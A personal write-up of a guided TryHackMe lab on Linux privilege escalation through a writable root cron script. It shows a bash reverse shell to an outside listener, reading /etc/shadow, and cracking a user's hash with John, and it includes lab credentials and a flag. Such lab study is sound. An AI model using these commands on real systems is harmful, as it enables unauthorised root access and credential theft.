**Main Topic:** Linux_Privilege_Escalation
**Sub Topic:** linux_privesc_writeup_cronjobs
**Date:** 22-05-2026
**Resources:**
**Related Notes:** [Linux Privilege Escalation](/Offensive_Security/Linux_Privilege_Escalation/linux_privesc_writeup_cronjobs.md)
Tags: #status/done 
# TryHackMe — linux_privesc_writeup_cronjobs

**Platform:** [TryHackMe](https://tryhackme.com)
**Room:** [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)
**Task:** Task 9 - Cron Jobs
**Difficulty:**

> This is a guided TryHackMe room, not an independent CTF challenge.
> The target credentials were provided by the platform.
> The purpose of this writeup is to document the techniques practiced and
> reinforce learning, not to demonstrate blind exploitation.

> **Username: karen**
> **Password: Password1**

---

## Connection

```bash
$ ssh karen@10.114.169.150
```

```bash
# Shell stabilisation (if needed)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 57 columns 235
```


---

## Question 1 — How many user-defined cron jobs can you see on the target system?

### Any user can read the file keeping system-wide cron jobs under `/etc/crontab`

```bash
karen@ip-10-112-176-90:~$ cat /etc/crontab     
# /etc/crontab: system-wide crontab  
# Unlike any other crontab you don't have to run the `crontab'  
# command to install the new version when you edit this file  
# and files in /etc/cron.d. These files also have username fields,  
# that none of the other crontabs do.  
  
SHELL=/bin/sh  
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin  
  
# Example of job definition:  
# .---------------- minute (0 - 59)  
# |  .------------- hour (0 - 23)  
# |  |  .---------- day of month (1 - 31)  
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...  
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat  
# |  |  |  |  |  
# *  *  *  *  * user-name command to be executed  
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly  
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )  
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )  
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )  
#  
* * * * *  root /antivirus.sh  
* * * * *  root antivirus.sh  
* * * * *  root /home/karen/backup.sh  
* * * * *  root /tmp/test.py
```

---

## Question 2 — What is the content of the flag5.txt file? 

### Locate the flag5.txt
```bash
karen@ip-10-112-176-90:~$ find / -name flag5.txt 2>/dev/null
/home/ubuntu/flag5.txt
```

### Trying get content
```bash
karen@ip-10-112-176-90:~$ cat /home/ubuntu/flag5.txt    
cat: /home/ubuntu/flag5.txt: Permission denied
```

> Of course, we get the “Permission denied” output. As mentioned in the section, we need to use cron jobs for privilege escalation. Therefore, we should try the output from “Question 1.”

> We see `/home/karen/backup.sh`. Let's give it a try.

### Check the file writable
```bash
karen@ip-10-112-176-90:~$ ls -la /home/karen/backup.sh    
-rw-r--r-- 1 karen karen   77 Jun 20  2021 /home/karen/backup.sh
```
> "Karen owns the file, so despite the `r--` permissions for group and others, the owner can write to it."

### Set up a reverse shell connection
#### Set up a listener on Kali
```bash
kali@kali: nc -lnvp 4444
```

#### In target machine use backup.sh
```bash
karen@ip-10-112-176-90:~$ echo '#!/bin/bash' > /home/karen/backup.sh  
karen@ip-10-112-176-90:~$ echo 'bash -i >& /dev/tcp/192.168.173.115/4444 0>&1' >> /home/karen/backup.sh  
karen@ip-10-112-176-90:~$ chmod +x /home/karen/backup.sh
```

> "This redirects bash's stdin, stdout, and stderr to a TCP connection — effectively sending an interactive shell to the listener."
> 
> It trigerred in every minute. Wait for connection then we have root shell in our listener.

```bash
root@ip-10-112-176-90:~# whoami  
whoami  
root
```

### Get the content of flag5.txt
```bash
root@ip-10-112-176-90:/# cat /home/ubuntu/flag5.txt  
cat /home/ubuntu/flag5.txt  
THM-383000283
```
---

## Question 3 — What is Matt's password?

We have root privileges so we can access `/etc/shadow` and we can use  [John](/Tools/John_the_Ripper/0_John_the_Ripper_MOC.md).

```bash
root@ip-10-112-176-90:/# cat /etc/shadow  
cat /etc/shadow
matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::  
```

In kali: 
```bash
echo 'matt:$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.:18798:0:99999:7:::' >> matt.txt
```

### Use john
```bash
john matt.txt --wordlist=/usr/share/wordlists/rockyou.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])  
Cost 1 (iteration count) is 5000 for all loaded hashes  
Will run 6 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
123456           (matt)        
1g 0:00:00:00 DONE (2026-05-24 18:19) 7.142g/s 5485p/s 5485c/s 5485C/s 123456..james1  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```

---

## Key Takeaways

- Cron jobs running as root with user-owned scripts are a direct privesc path
- Always `chmod +x` before waiting — cron won't execute non-executable scripts
- `* * * * *` means every minute; don't wait more than 60 seconds

---

## Related Notes
- [Linux Privilege Escalation](/Offensive_Security/Linux_Privilege_Escalation/linux_privesc_notes.md)